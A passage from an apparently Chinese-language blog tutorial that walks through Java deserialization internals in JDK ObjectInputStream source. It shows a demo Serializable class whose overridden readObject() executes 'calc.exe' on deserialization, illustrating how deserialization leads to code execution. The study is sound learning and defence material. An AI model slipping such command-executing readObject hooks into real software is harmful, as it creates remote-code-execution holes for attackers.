class="keyword">implements</span> <span class="title class_">Serializable</span> {</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, Integer age)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.getName());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> {</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User [name="</span> + name + <span class="string">", age="</span> + age + <span class="string">"]"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException{</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后和前面一样的，先运行<code>SerializeDemo.java</code>进行序列化，然后运行<code>DeSerializeDemo.java</code>反序列化，成功执行命令，弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240114173309135.png" alt="成功弹出计算器"></p><h2 id="0x03-对反序列化的流程分析"><a href="#0x03-对反序列化的流程分析" class="headerlink" title="0x03 对反序列化的流程分析"></a>0x03 对反序列化的流程分析</h2><p>我们在<code>DeSerializeDemo</code>的<code>readObject</code>处打上断点，分析反序列化流程(以后用<code>类名#方法</code>形式代指跟进到那个类的方法中)：</p><p>首先跟进到<code>ObjectInputStream#readObject</code>方法中，</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240114180304410.png" alt="ObjectInputStream#readObject"></p><p>这里会调用<code>readObject</code>的另外一个重载方式：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">(Class&lt;?&gt; type)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (enableOverride) {</span><br><span class="line">            <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! (type == Object.class || type == String.class))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">"internal error"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">outerHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> readObject0(type, <span class="literal">false</span>);</span><br><span class="line">            handles.markDependency(outerHandle, passHandle);</span><br><span class="line">            <span class="type">ClassNotFoundException</span> <span class="variable">ex</span> <span class="operator">=</span> handles.lookupException(passHandle);</span><br><span class="line">            <span class="keyword">if</span> (ex != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (depth == <span class="number">0</span>) {</span><br><span class="line">                vlist.doCallbacks();</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        } <span class="keyword">finally</span> {</span><br><span class="line">            passHandle = outerHandle;</span><br><span class="line">            <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) {</span><br><span class="line">                clear();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>对于第一行的<code>enableOverride</code>,它来自<code>ObjectInputStream</code>构造方法，当调用其无参构造函数时会设定为true，我们这里因为传了<code>fileInputStream</code>，所以为false，并不会进入。接下来可以看到Obj的获取来自<code>readObject0</code>，跟进<code>ObjectInputStream#readObject0</code>看看：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject0</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line"><span class="comment">// 略去源码中对读取模式的检查</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取一个字节</span></span><br><span class="line">    <span class="type">byte</span> tc;</span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) {</span><br><span class="line">        bin.readByte();</span><br><span class="line">        handleReset();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    depth++;</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">switch</span> (tc) {</span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">"writing aborted"</span>, ex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line"><span class="comment">// 略</span></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line"><span class="comment">// 略</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                    String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">finally</span> {</span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这一部分会先读取一个字节，这个字节是我刚才说的序列化特征aced 0005之后的一个字节，我这里是0x73，十进制的115，之后便会根据这个值进入switch对应的分支：TC_OBJECT，在这之中会继续跟进到<code>ObjectInputStream#readOrdinaryObject</code>函数之中。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240114181756999.png" alt="进入TC_OBJECT分支"></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readOrdinaryObject</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> readClassDesc(<span class="literal">false</span>);</span><br><span class="line">        desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">        <span class="keyword">if</span> (cl == String.class || cl == Class.class</span><br><span class="line">                || cl == ObjectStreamClass.class) {</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        Object obj;</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            obj = desc.isInstantiable() ? desc.newInstance() : <span class="literal">null</span>;</span><br><span class="line">        } <span class="keyword">catch</span> (Exception ex) {</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                desc.forClass().getName(),</span><br><span class="line">                <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">        }</span><br><span class="line">    <span class="comment">//略</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable()) {</span><br><span class="line">            readExternalData((Externalizable) obj, desc);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            readSerialData(obj, desc);</span><br><span class="line">        }</span><br><span class="line">    <span class="comment">//略</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p><code>ObjectInputStream#readOrdinaryObject</code>方法中的一些不重要的细节我就直接略过了，主要是看obj的来源。从中可以看到obj的实例化来自于desc，而desc来自<code>ObjectInputStream#readClassDesc</code>，所以先跟进到<code>ObjectInputStream#readClassDesc</code>方法中：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readClassDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">{</span><br><span class="line">    <span class="type">byte</span> <span class="variable">tc</span> <span class="operator">=</span> bin.peekByte();</span><br><span class="line">    ObjectStreamClass descriptor;</span><br><span class="line">    <span class="keyword">switch</span> (tc) {</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            descriptor = (ObjectStreamClass) readNull();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            descriptor = (ObjectStreamClass) readHandle(unshared);</span><br><span class="line">            <span class="comment">// Should only reference initialized class descriptors</span></span><br><span class="line">            descriptor.checkInitialized();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            descriptor = readProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            descriptor = readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (descriptor != <span class="literal">null</span>) {</span><br><span class="line">        validateDescriptor(descriptor);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里又是一个<code>switch</code>语句，由于我们这里是一个类，所以会进入<code>TC_CLASSDESC</code>，使用<code>readNonProxyDesc</code>获得类的描述信息（字段值之类的）。那就继续跟进到<code>ObjectInputStream#readNonProxyDesc</code>中：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readNonProxyDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//略</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        readDesc = readClassDescriptor();</span><br><span class="line">    } <span class="keyword">catch</span> (ClassNotFoundException ex) {</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">            <span class="string">"failed to read class descriptor"</span>).initCause(ex);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">checksRequired</span> <span class="operator">=</span> isCustomSubclass();</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="literal">null</span>) {</span><br><span class="line">            resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">"null class"</span>);</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) {</span><br><span class="line">            ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">catch</span> (ClassNotFoundException ex) {</span><br><span class="line">        resolveEx = ex;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call filterCheck on the class before reading anything else</span></span><br><span class="line">    filterCheck(cl, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    skipCustomData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        totalObjectRefs++;</span><br><span class="line">        depth++;</span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) {</span><br><span class="line">            <span class="comment">// Check that serial filtering has been done on the local class descriptor's superclass,</span></span><br><span class="line">            <span class="comment">// in case it does not appear in the stream.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Find the next super descriptor that has a local class descriptor.</span></span><br><span class="line">            <span class="comment">// Descriptors for which there is no local class are ignored.</span></span><br><span class="line">            <span class="type">ObjectStreamClass</span> <span class="variable">superLocal</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">ObjectStreamClass</span> <span class="variable">sDesc</span> <span class="operator">=</span> desc.getSuperDesc(); sDesc != <span class="literal">null</span>; sDesc = sDesc.getSuperDesc()) {</span><br><span class="line">                <span class="keyword">if</span> ((superLocal = sDesc.getLocalDesc()) != <span class="literal">null</span>) {</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Scan local descriptor superclasses for a match with the local descriptor of the super found above.</span></span><br><span class="line">            <span class="comment">// For each super descriptor before the match, invoke the serial filter on the class.</span></span><br><span class="line">            <span class="comment">// The filter is invoked for each class that has not already been filtered</span></span><br><span class="line">            <span class="comment">// but would be filtered if the instance had been serialized by this Java runtime.</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">ObjectStreamClass</span> <span class="variable">lDesc</span> <span class="operator">=</span> desc.getLocalDesc().getSuperDesc();</span><br><span class="line">                 lDesc != <span class="literal">null</span> &amp;&amp; lDesc != superLocal;</span><br><span class="line">                 lDesc = lDesc.getSuperDesc()) {</span><br><span class="line">                filterCheck(lDesc.forClass(), -<span class="number">1</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">finally</span> {</span><br><span class="line">        depth--;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    handles.finish(descHandle);</span><br><span class="line">    passHandle = descHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里先是使用<code>readClassDescriptor()</code>获得了我们的字段信息，然后使用<code>ObjectInputStream#resolveClass</code>去解析。最后使用<code>initNonProxy</code>把刚刚的字段信息，装载成类描述符，然后返回。这里比较重要的部分是<code>ObjectInputStream#resolveClass()</code>这部分，跳过其他步骤跟进去看看：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    {</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">        } <span class="keyword">catch</span> (ClassNotFoundException ex) {</span><br><span class="line">            Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">return</span> cl;</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>看到<code>Class.forName</code>你就知道为什么说resolveClass这块比较重要了,这里利用了我之前文章中讲过的反射来调用我们的类，<strong>很多反序列化的防御都是在这里限制了白名单或者黑名单来控制了反序列化。</strong></p><p>接下来继续往下跟进，直到回到<code>ObjectInputStream#readOrdinaryObject</code>中，接着就是进入到checkDeserialize()中检查是否可以反序列化：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">checkDeserialize</span><span class="params">()</span> <span class="keyword">throws</span> InvalidClassException {</span><br><span class="line">        requireInitialized();</span><br><span class="line">        <span class="keyword">if</span> (deserializeEx != <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">throw</span> deserializeEx.newInvalidClassException();</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>完成后我们继续跟进，一直来到<code>ObjectInputStream#readSerialData</code>方法中，代码如下所示：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">{</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) {</span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) {</span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="literal">null</span> || handles.lookupException(passHandle) != <span class="literal">null</span>) {</span><br><span class="line">                defaultReadFields(<span class="literal">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            } <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) { <span class="comment">// 判断是否有重写readObject</span></span><br><span class="line">         <span class="comment">// 略</span></span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="built_in">this</span>); <span class="comment">// 调用重写的readObject</span></span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException ex) {</span><br><span class="line"><span class="comment">// 略</span></span><br><span class="line">                } <span class="keyword">finally</span> {</span><br><span class="line">                <span class="comment">// 略</span></span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                defaultReadFields(obj, slotDesc); <span class="comment">// 这里</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (slotDesc.hasWriteObjectData()) {</span><br><span class="line">                skipCustomData();</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line">                handles.lookupException(passHandle) == <span class="literal">null</span>)</span><br><span class="line">            {</span><br><span class="line">                slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里会先判断是否有重写的<code>readObject</code>，如果有就调用<code>invokeReadObject</code>，其内部反射调用了我们重写的<code>readObject</code>（这时候就触发了我们实验代码中的RCE），没有就调用<code>defaultReadFields</code>进行数据填充（重写<code>readObject</code>中的<code>in.defaultReadObject</code>其实里面也是调用<code>defaultReadFields</code>）。经过这个函数反序列化基本结束，之后<code>readOrdinaryObject</code>返回Obj，<code>readObject</code>中再调用 vlist.doCallbacks()处理回调，结束反序列化流程，返回反序列化成功的Object:</p><p><img 